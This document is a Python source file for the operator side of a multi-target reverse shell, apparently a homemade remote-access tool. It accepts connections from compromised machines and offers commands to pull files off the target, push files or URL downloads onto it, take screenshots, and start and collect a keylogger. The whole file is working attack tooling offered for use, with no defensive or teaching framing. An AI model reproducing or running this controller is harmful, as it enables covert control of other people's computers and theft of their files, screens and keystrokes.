#!/usr/bin/python3

import socket
import threading
import json
import base64
import os
from termcolor import colored
from pyfiglet import figlet_format
	

print("--------------------------------------------------------------------------------------------------------------\n\n\n")
print(colored("                   ____                                   _____ __         ____","blue"))
print(colored("                  / __ \___ _   _____  _____________     / ___// /_  ___  / / /","blue"))
print(colored("                 / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / / ","blue"))
print(colored("                / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  ","blue"))
print(colored("               /_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/   ","blue"))
print("\n\n\n")
print("---------------------------------------------------------------------------------------------------------------\n") 
                                                               

	
count=1	
keys=1
temp=0

def sendall(target,data):
	
	if isinstance(data,bytes):
		data=data.decode("utf-8")
	json_data=json.dumps(data)
	target.send(json_data.encode("utf-8"))
	
	
def remove(target,ip):
	
	target.close()
	if target in targets:
		targets.remove(target)
	if ip in ip_adds:
		ip_adds.remove(ip)   
	

def removeall():
	
	for target in targets:
		target.close()
		targets.remove(target)
	for ip in ip_adds:
		ip_adds.remove(ip)   
		
	
def shell(target,ip):
	global temp
	
	def reliable_send(data):
		
		if isinstance(data,bytes):
			data=data.decode("utf-8")
		json_data=json.dumps(data)
		target.send(json_data.encode("utf-8"))
		
	
	def reliable_recv():
		
		data=""
		while True:
			try:
				
				data= data+target.recv(1024).decode()
				if isinstance(data,bytes):
					data=data.decode("utf-8")
				#data=data.encode()
				return json.loads(data)
			except ValueError:
				continue   
	
	#if temp==0:
	result=reliable_recv()	
	print(colored(str(result),"red"))
	#temp=0
	command=""

	while True:
		command=input("Shell#~")
		reliable_send(command)
		if(command=="q"):
			print(colored("[-] Disconnecting Wait......","blue") )
			return 1
		elif (command=="back"):
			return 0
				
		elif command=="help":
			print(colored("-------------------------------------------------------------------------------Reverse Shell-------------------------------------------------------------------------------------------------","yellow"))
			print(colored("                                                ---------------------------------Commands---------------------------------------","yellow"))	
			print(colored("                                                                        <----------Note---------> ","yellow"))
			print("\n\n\n")
			print(colored(" COMMAND                      This Shell execute all the OS commands that a user has due to its privilege , but this shell provides some special commands thats helps to manage things between target and server ","magenta"))		
			print(colored(" 1- download [file_path]      This commmand helps to download a file from the targets computer","magenta"))
			print(colored(" 2- upload [file_path]        This command helps to upload a file to target computer","magenta"))
			print(colored(" 3- screenshot                This command helps to taken the screenshot from target computer and download it to server","magenta"))
			print(colored(" 4- gets [url]                This will help to the file to the targets computer form any url ","magenta"))
			print(colored(" 5- keylog_start              This will start the keylogger in the target system","magenta"))
			print(colored(" 6- keylog_dump               This will transfer the logs generated by keylogger to the server ","magenta"))
			print(colored(" 5- back                      This will help us to go to global shell that is Limited Shell","magenta"))
			print(colored(" 6- q                         This will quit the connection with the target ","magenta"))
			
		elif (len(command)>0  ):
				
			comm=command.split()
			if ( len(comm)>0 and  comm[0]=="download" ):
				with open(comm[1],"wb" ) as file1:
					file_data=reliable_recv()
					if(file_data=="[-]"):
						print(file_data)
						continue
					file1.write(base64.b64decode(file_data))
							
			elif ( len(comm)>0 and  comm[0]=="upload" ):
				try:
					print(comm[1])
					path = os.path.exists(comm[1])
					if not path:
						print("[-] Sorry the file does not exist in specified path ")
						continue
					else :
						
						with open(comm[1],"rb") as file2:
							reliable_send(base64.b64encode(file2.read()) )
				except:
					failed="[-] Failed To Upload"
					reliable_send(failed)
					print(failed)	
					
			elif(len(comm)>0 and comm[0]=="screenshot"):
				global count
				with open("screenshot%d" %count,"wb") as shot:
					image=reliable_recv()
					image_decoded=base64.b64decode(image)
					if(image_decoded[:3]=="[-]"):
						print(image_decoded)
					else:
						shot.write(image_decoded)
					count+=1
							
			elif (len(comm)>0 and comm[0]=="keylog_start"):
				continue
			elif (len(comm)>0 and comm[0]=="keylog_dump"):
				global keys
				with open("keylog_dump%d" %keys,"wb" ) as file1:
					file_data=reliable_recv()
					print("1")
					file_data=file_data.encode("utf-8")
					file1.write(file_data)
					#file1.write(base64.b64decode(file_data))
					keys+=1
						
			elif( len(comm)>0 and  comm[0]!="cd" ):
				result=reliable_recv()
				print(colored(str(result),"red"))
		
		
def server():
	global clients_count
	while True:
		if stop_threads:
			break
		s.settimeout(1)
		try:
			target,ip=s.accept()
			print(colored(f"[+] Connection Established from {ip}","red"))
			targets.append(target)
			ip_adds.append(ip)
			clients_count+=1
		except:
			pass


	
	
global s 
host=socket.gethostbyname(socket.gethostname())
port=9988
targets =[]
ip_adds=[]
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((host,port))
s.listen(5)
print(colored("[*] Listening for Connections","green"))
clients_count=0

stop_threads=False

t1=threading.Thread(target=server)
t1.start() 

while True:
	
	command=input("Command-Shell#~")
	comm=command.split(" ")
	if command=="targets":
		count=0
		if not ip_adds:
			print(colored("[-] No Connection Found","blue"))
		else :
			for ip in ip_adds:
				print(colored(f"Session {count} <-----> IP:{ip}","red"))
				count+=1
				
	elif command=="removeAll":
		removeall()
		
	#elif command[:7]=="sendAll":
	#	try:
	#		for target in targets:
	#			print(target)
	#			sendall(target,command)
	#	except :
	#		failed_send="[-] !! Failed to send to all the targets";
	#		print(failed_send)
	#	temp=1
	#	continue
			
	elif command[:7]=="session":
		#try:
		num=int(command[8:])
		target_sock=targets[num]
		target_ip=ip_adds[num]	
		conn=shell(target_sock,target_ip)
		if conn==1:
			remove(target_sock,target_ip)	
		else: 
			continue
		#except Exception as e:
		#	print(e)
		#	print("[-] Error !!! No Session were found!")
			
			
	elif command=="exit":
		removeall()
		s.close()
		stop_threads=True
		t1.join()
		break
	
	elif command=="help":
		print(colored("------------------------------------------------------------Limited SHell----------------------------------------------------------------------------","yellow"))
		print(colored("                       ----------------------------------------Commands--------------------------------------                      ","yellow"))
		print(colored(" 1- targets                  This shows the number of connected targets","magenta"))
		print(colored(" 2- session [number]         This commands helps us to use the specified session ","magenta"))
		print(colored(" 3- removeAll                To exit all the connection ","magenta"))
		print(colored(" 4- sendAll [command]        To send command to all the targets ","magenta"))
		print(colored(" 5- help                     To show help menu  ","magenta"))
		print(colored(" 6- exit                     To exit the Reverse Shell ","magenta"))
		
			
			
			
			
			
			
			
			
			
			
			
			
					
